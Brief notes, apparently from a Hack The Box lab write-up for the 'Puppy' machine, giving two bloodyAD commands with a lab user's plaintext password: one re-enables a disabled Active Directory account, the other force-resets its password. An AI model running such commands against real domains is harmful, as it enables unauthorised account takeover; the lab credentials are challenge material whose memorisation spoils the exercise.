enable user:
```bash
bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE

```
ant.edwards, Antman2025! -> valid user
adam.silver -> account to be enabled

---

force change password:
```bash
bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'P@ssw4rd123'
```
